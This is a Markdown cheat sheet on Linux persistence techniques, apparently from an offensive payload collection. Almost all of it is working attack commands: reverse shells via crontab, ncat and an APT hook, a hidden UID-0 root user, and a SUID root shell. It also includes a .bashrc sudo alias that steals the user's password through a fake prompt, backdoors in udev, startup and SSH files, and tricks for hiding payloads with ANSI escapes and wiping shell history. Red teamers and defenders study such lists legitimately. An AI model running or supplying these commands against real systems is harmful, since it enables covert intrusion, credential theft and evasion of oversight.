# Linux - Persistence

## Summary

* [Basic reverse shell](#basic-reverse-shell)
* [Add a root user](#add-a-root-user)
* [Suid Binary](#suid-binary)
* [Crontab - Reverse shell](#crontab-reverse-shell)
* [Backdooring a user's bash_rc](#backdooring-an-users-bash-rc)
* [Backdooring a startup service](#backdoor-a-startup-service)
* [Backdooring a user startup file](#backdooring-an-user-startup-file)
* [Backdooring a driver](#backdooring-a-driver)
* [Backdooring the APT](#backdooring-the-apt)
* [Backdooring the SSH](#backdooring-the-ssh)
* [Tips](#tips)
* [References](#references)


## Basic reverse shell

```bash
ncat --udp -lvp 4242
ncat --sctp -lvp 4242
ncat --tcp -lvp 4242
```

## Add a root user

```powershell
sudo useradd -ou 0 -g 0 john
sudo passwd john
```

## Suid Binary

```powershell
TMPDIR2="/var/tmp"
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
rm $TMPDIR2/croissant.c
chown root:root $TMPDIR2/croissant
chmod 4777 $TMPDIR2/croissant
```

## Crontab - Reverse shell

```bash
(crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null
```

## Backdooring a user's bash_rc 

(FR/EN Version)

```bash
TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"
cat << EOF > /tmp/$TMPNAME2
  alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale  = "en" ]; then echo -n "[sudo] password for \$USER: ";fi;if [ \$locale  = "fr" ]; then echo -n "[sudo] Mot de passe de \$USER: ";fi;read -s pwd;echo; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S '
EOF
if [ -f ~/.bashrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.bashrc
fi
if [ -f ~/.zshrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.zshrc
fi
rm /tmp/$TMPNAME2
```

## Backdooring a startup service

```bash
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
```

## Backdooring a user startup file

Linux, write a file in  `~/.config/autostart/NAME_OF_FILE.desktop`

```powershell
In : ~/.config/autostart/*.desktop

[Desktop Entry]
Type=Application
Name=Welcome
Exec=/var/lib/gnome-welcome-tour
AutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guide
OnlyShowIn=GNOME;
X-GNOME-Autostart-enabled=false
```

## Backdooring a driver

```bash
echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
```

## Backdooring the APT

If you can create a file on the apt.conf.d directory with: `APT::Update::Pre-Invoke {"CMD"};`
Next time "apt-get update" is done, your CMD will be executed!

```bash
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
```

## Backdooring the SSH

Add an ssh key into the `~/.ssh` folder.

1. `ssh-keygen`
2. write the content of `~/.ssh/id_rsa.pub` into `~/.ssh/authorized_keys`
3. set the right permission, 700 for ~/.ssh and 600 for authorized_keys

## Tips

Hide the payload with ANSI chars, the following chars will clear the terminal when using cat to display the content of your payload.

```bash
#[2J[2J[2J[2H[2A# Do not remove. Generated from /etc/issue.conf by configure.
```

Clear the last line of the history.

```bash
history -d $(history | tail -2 | awk '{print $1}') 2> /dev/null
```

Clear history

```bash
[SPACE] ANY COMMAND
or
export HISTSIZE=0
export HISTFILESIZE=0
unset HISTFILE; CTRL-D
or
kill -9 $$
or
echo "" > ~/.bash_history
or
rm ~/.bash_history -rf
or
history -c
or
ln /dev/null ~/.bash_history -sf
```

The following directories are temporary and usually writeable

```bash
/var/tmp/
/tmp/
/dev/shm/
```

## References

* [@RandoriSec - https://twitter.com/RandoriSec/status/1036622487990284289](https://twitter.com/RandoriSec/status/1036622487990284289)
* [https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/](https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/)
* [http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html](http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html)
* [http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/](http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/)
* [Pouki from JDI](#no_source_code)